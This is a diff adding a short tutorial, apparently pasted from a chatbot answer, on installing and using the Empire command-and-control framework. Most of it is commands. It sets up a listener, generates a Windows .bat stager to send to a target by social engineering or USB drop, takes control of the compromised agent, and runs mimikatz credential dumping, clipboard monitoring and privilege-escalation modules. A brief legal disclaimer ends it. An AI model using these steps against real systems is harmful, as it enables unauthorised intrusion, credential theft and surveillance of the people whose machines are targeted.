@@ -1,0 +1,85 @@
+✅ Step 1: Install Empire in Kali Linux
+Option 1: Using Kali Built-in (if available)
+Empire is sometimes included in Kali, but if not:
+
+Option 2: Manual Installation
+bash
+Copy
+Edit
+# Install dependencies
+sudo apt update
+sudo apt install git python3-pip python3-venv -y
+
+# Clone Empire
+git clone https://github.com/BC-SECURITY/Empire.git
+cd Empire
+
+# Install Empire
+./setup/install.sh
+✅ Step 2: Start Empire
+After installation:
+
+bash
+Copy
+Edit
+# Navigate to Empire folder
+cd Empire
+
+# Start Empire
+./empire
+This will load the Empire CLI (Command Line Interface).
+
+✅ Step 3: Using Empire (Basic Commands)
+1. Start a Listener
+Listeners are needed to receive connections from agents.
+
+bash
+Copy
+Edit
+listeners
+uselistener http
+set Name myListener
+set Port 8080
+execute
+2. Generate a Stager (Payload)
+Stagers are used to deliver and run agents on target systems.
+
+bash
+Copy
+Edit
+usestager windows/launcher_bat
+set Listener myListener
+generate
+You’ll get a .bat file payload. Send this to the target (social engineering, USB drop, etc.).
+
+3. Interact with the Agent
+Once the target runs the payload, you'll get a live agent session.
+
+bash
+Copy
+Edit
+agents
+interact <agent_name>
+4. Run Post-Exploitation Modules
+Examples:
+
+bash
+Copy
+Edit
+usemodule credentials/mimikatz/logonpasswords
+execute
+Or use modules like:
+
+powershell/situation_awareness/network/ping_sweep
+
+collection/clipboard_monitor
+
+privesc/powerup/allchecks
+
+✅ Step 4: Exit Empire
+bash
+Copy
+Edit
+exit
+⚠️ Legal Warning:
+Empire is a powerful hacking tool. Use only in legal penetration testing environments, CTFs, labs, or with written permission. Unauthorized use is illegal.
